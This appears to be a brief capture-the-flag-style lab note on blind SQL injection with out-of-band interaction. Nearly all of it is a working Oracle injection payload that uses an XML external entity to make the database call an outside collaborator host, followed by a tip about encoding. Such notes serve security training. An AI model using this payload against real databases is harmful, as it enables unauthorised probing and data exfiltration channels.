# Blind SQL injection with out-of-band interaction

1. Send the following payload to trigger an interaction with collaborator and solve the lab

```
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://b9lgosxai5adgeuxb0c8qn6fs6yxmoad.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

![[attachments/sqli-lab-16/file-20260206135416464.png]]

> [!tip] "Be careful of the encoding here"


